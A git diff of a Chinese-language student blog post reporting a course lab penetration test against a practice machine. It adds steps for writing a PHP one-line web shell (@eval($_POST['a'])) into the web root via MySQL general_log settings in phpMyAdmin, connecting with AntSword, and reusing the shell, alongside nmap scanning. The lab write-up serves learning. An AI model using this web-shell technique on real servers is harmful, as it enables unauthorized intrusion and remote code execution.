@@ -6,12 +6,12 @@
   
   <title>课设第三天渗透报告 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="web渗透的第一步是信息采集，我打开了目标靶机，查询了他的网段为192.168.58.139  回到kali中用nmap扫描目标主机的网段，nmap是一个可以用于渗透测试德工具，用来获取目标主机的开放端口等信息，如下图扫描后发现了135&#x2F;tcp，139&#x2F;tcp等一些端口  再次使用namp工具对目标ip进行详细扫描，使用的nmap命令为 nmap -sT -sV -O -p-">
+  <meta name="description" content="web渗透的第一步是信息采集，我打开了目标靶机，查询了他的网段为192.168.58.139  回到kali中用nmap扫描目标主机的网段，nmap是一个可以用于渗透测试工具，用来获取目标主机的开放端口等信息，如下图扫描后发现了135&#x2F;tcp，139&#x2F;tcp等一些端口  再次使用namp工具对目标ip进行详细扫描，使用的nmap命令为 nmap -sT -sV -O -p- 1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="课设第三天渗透报告">
 <meta property="og:url" content="http://example.com/2025/10/29/%E8%AF%BE%E8%AE%BE%E7%AC%AC%E4%B8%89%E5%A4%A9%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="web渗透的第一步是信息采集，我打开了目标靶机，查询了他的网段为192.168.58.139  回到kali中用nmap扫描目标主机的网段，nmap是一个可以用于渗透测试德工具，用来获取目标主机的开放端口等信息，如下图扫描后发现了135&#x2F;tcp，139&#x2F;tcp等一些端口  再次使用namp工具对目标ip进行详细扫描，使用的nmap命令为 nmap -sT -sV -O -p-">
+<meta property="og:description" content="web渗透的第一步是信息采集，我打开了目标靶机，查询了他的网段为192.168.58.139  回到kali中用nmap扫描目标主机的网段，nmap是一个可以用于渗透测试工具，用来获取目标主机的开放端口等信息，如下图扫描后发现了135&#x2F;tcp，139&#x2F;tcp等一些端口  再次使用namp工具对目标ip进行详细扫描，使用的nmap命令为 nmap -sT -sV -O -p- 1">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/day3/1.png">
 <meta property="og:image" content="http://example.com/day3/2.png">
@@ -21,8 +21,17 @@
 <meta property="og:image" content="http://example.com/day3/6.png">
 <meta property="og:image" content="http://example.com/day3/7.png">
 <meta property="og:image" content="http://example.com/day3/8.png">
+<meta property="og:image" content="http://example.com/day3/9.png">
+<meta property="og:image" content="http://example.com/day3/10.png">
+<meta property="og:image" content="http://example.com/day3/12.png">
+<meta property="og:image" content="http://example.com/day3/13.png">
+<meta property="og:image" content="http://example.com/day3/14.png">
+<meta property="og:image" content="http://example.com/day3/15.png">
+<meta property="og:image" content="http://example.com/day3/16.png">
+<meta property="og:image" content="http://example.com/day3/17.png">
+<meta property="og:image" content="http://example.com/day3/19.png">
 <meta property="article:published_time" content="2025-10-29T08:47:10.000Z">
-<meta property="article:modified_time" content="2025-10-29T10:05:05.939Z">
+<meta property="article:modified_time" content="2025-10-30T08:49:30.693Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/day3/1.png">
@@ -106,7 +115,7 @@
       
         <p>web渗透的第一步是信息采集，我打开了目标靶机，查询了他的网段为192.168.58.139</p>
 <p><img src="/day3/1.png" alt="1 查询目标的网段"></p>
-<p>回到kali中用nmap扫描目标主机的网段，nmap是一个可以用于渗透测试德工具，用来获取目标主机的开放端口等信息，如下图扫描后发现了135&#x2F;tcp，139&#x2F;tcp等一些端口</p>
+<p>回到kali中用nmap扫描目标主机的网段，nmap是一个可以用于渗透测试工具，用来获取目标主机的开放端口等信息，如下图扫描后发现了135&#x2F;tcp，139&#x2F;tcp等一些端口</p>
 <p><img src="/day3/2.png" alt="2 扫描网段发现目标"></p>
 <p>再次使用namp工具对目标ip进行详细扫描，使用的nmap命令为</p>
 <p><code>nmap -sT -sV -O -p- 192.168.58.139 -oN scan</code></p>
@@ -125,6 +134,31 @@
 <p>然后输入run开始此次攻击，不出意外也是攻击成功了，然后我们获取一下高级权限，接下来就可以对目标机为所欲为了</p>
 <p><img src="/day3/8.png" alt="8 获得高级权限"></p>
 <p>这就是我学习到的第一种web渗透的方法。</p>
+<p>接下来是我学到的第二种方法，在之前的深度扫描中，我发现了目标机的数据库phpmyadmin</p>
+<p><img src="/day3/9.png" alt="9"></p>
+<p>我在浏览器中输入了目标机的ip地址，进入到了phpstudy页面</p>
+<p><img src="/day3/10.png" alt="10"></p>
+<p>又在网址的后面加上了phpmyadmin，进入了登陆页面，用老师告诉的账号密码成功进入了目标机的phpmyadmin数据库当中（账号密码正常来说要用弱口令爆破的方法来获取)，进入数据库后，我先查询了一下自己的权限等级，如图中显示，我有目标主机数据库中的全部权限，足以支持接下来的渗透操作，输入指令</p>
+<p><code>set global general_log_file = &quot;C://phpStudy//WWW//shell.php&quot;;</code> </p>
+<p><code>set global general_log = &quot;on&quot;;</code></p>
+<p><code>show variables like &#39;%general%&#39;;</code></p>
+<p>用于开启日志查询功能</p>
+<p><img src="/day3/12.png" alt="11"></p>
+<p>输入指令</p>
+<p><code>show variables like &#39;%general&#39;</code></p>
+<p>查看与gneral相关的系统变量，从下图中可以了解到数据库的查询日志功能处于开启状态，日志会记录发送到数据库服务器的sql语句，我就可以借助这个功能植入一句话木马了</p>
+<p><img src="/day3/13.png" alt="12"></p>
+<p>输入下面语句，eval()  函数会把传入的字符串当作 PHP 代码来执行，利用  $_POST[‘a’]  来接收外部通过 POST 请求传递的代码并执行，a是我自己设置的密码</p>
+<p><code>select&quot;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&quot;</code></p>
+<p><img src="/day3/14.png" alt="13"></p>
+<p>最后利用蚁剑成功接入目标机</p>
+<p><img src="/day3/15.png" alt="14"></p>
+<p>这就是我学到的第二种渗透办法，看上面的图片，在接入目标机后，我发现了另一个数据库yxcms，在浏览器中尝试进入这个数据库，发现成功了，看下图，在这个数据库的公告中说明了进入数据库后台的网址和账号密码</p>
+<p><img src="/day3/16.png" alt="15"></p>
+<p>进入后台后，我想继续用植入一句话木马的办法尝试侵入目标机，但这次用蚁剑远程连接电脑需要有木马在目标电脑中的绝对路径，这个绝对路径我并不知道，而在用第二个办法入侵的时候，我创建的木马备份文件正好派上用场</p>
+<p><img src="/day3/17.png" alt="16"></p>
+<p>将备份文件拖到主机中，查看他的绝对路径，然后复制到蚁剑中，成功接入目标机，这就是我学到的第三种办法</p>
+<p><img src="/day3/19.png" alt="17"></p>
 
       
     </div>
